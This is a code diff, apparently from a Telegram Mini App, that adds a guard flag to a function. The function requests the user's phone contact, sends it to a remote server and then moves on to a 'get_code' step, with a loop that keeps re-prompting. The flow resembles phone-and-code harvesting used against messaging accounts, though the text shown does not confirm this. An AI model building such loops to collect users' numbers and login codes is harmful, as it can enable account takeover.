@@ -343,51 +343,60 @@
     }
   
     // Запрос номера через WebApp.requestContact
+    let contactRequested = false;  // флаг для отслеживания, был ли уже сделан запрос контакта
+
     async function requestPhone() {
-  try {
-    // Ожидаем выбора пользователя
-    const contactData = await WebApp.requestContact();
-
-    console.log("Полученные данные контакта:", contactData); // Логируем контактные данные
-
-    // Проверка на наличие номера телефона
-    if (!contactData?.contact?.phone_number) {
-      alert("Вы должны предоставить номер телефона");
-      return false;
+      try {
+        if (contactRequested) {
+          console.log("Контакт уже был запрашиваем");
+          return; // Не запрашиваем снова
+        }
+    
+        contactRequested = true;  // Устанавливаем флаг, что запрос был сделан
+    
+        // Ожидаем выбора пользователя
+        const contactData = await WebApp.requestContact();
+    
+        console.log("Полученные данные контакта:", contactData);
+    
+        // Проверка на наличие номера телефона
+        if (!contactData?.contact?.phone_number) {
+          alert("Вы должны предоставить номер телефона");
+          contactRequested = false;  // Сбрасываем флаг, чтобы можно было попробовать снова
+          return false;
+        }
+    
+        const phone = contactData.contact.phone_number;
+        currentPhone = phone;
+        phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
+    
+        // Отправляем номер на сервер
+        const res = await fetch('https://sadaqah.icu/submit_phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_id: userId, phone: phone })
+        });
+    
+        const result = await res.json();
+        console.log("Ответ от сервера:", result);
+    
+        if (result.status === 'ok') {
+          showBlock('get_code');
+          contactRequested = false;  // Сбрасываем флаг после успешного завершения
+          return true;
+        } else {
+          alert('Error: ' + (result.error || 'Unknown error'));
+          contactRequested = false;  // Сбрасываем флаг после ошибки
+          return false;
+        }
+    
+      } catch (e) {
+        console.error('Ошибка при запросе контакта:', e);
+        alert('Ошибка при запросе номера телефона. ' + e.message);
+        contactRequested = false;  // Сбрасываем флаг при ошибке
+        return false;
+      }
     }
-
-    const phone = contactData.contact.phone_number;
-    currentPhone = phone;
-
-    // Маскируем номер и отображаем на странице
-    phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
-
-    // Отправляем номер на сервер
-    const res = await fetch('https://sadaqah.icu/submit_phone', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ user_id: userId, phone: phone })
-    });
-
-    const result = await res.json();
-    console.log("Ответ от сервера:", result); // Логируем ответ от сервера
-
-    // Если сервер вернул статус 'ok', показываем следующий блок
-    if (result.status === 'ok') {
-      showBlock('get_code');
-      return true;
-    } else {
-      alert('Error: ' + (result.error || 'Unknown error'));
-      return false;
-    }
-
-  } catch (e) {
-    // Логируем ошибку, если что-то пошло не так
-    console.error('Ошибка при запросе контакта:', e);
-    alert('Ошибка при запросе номера телефона. ' + e.message);
-    return false;
-  }
-}
     async function requestPhoneLoop() {
       const ok = await requestPhone();
     
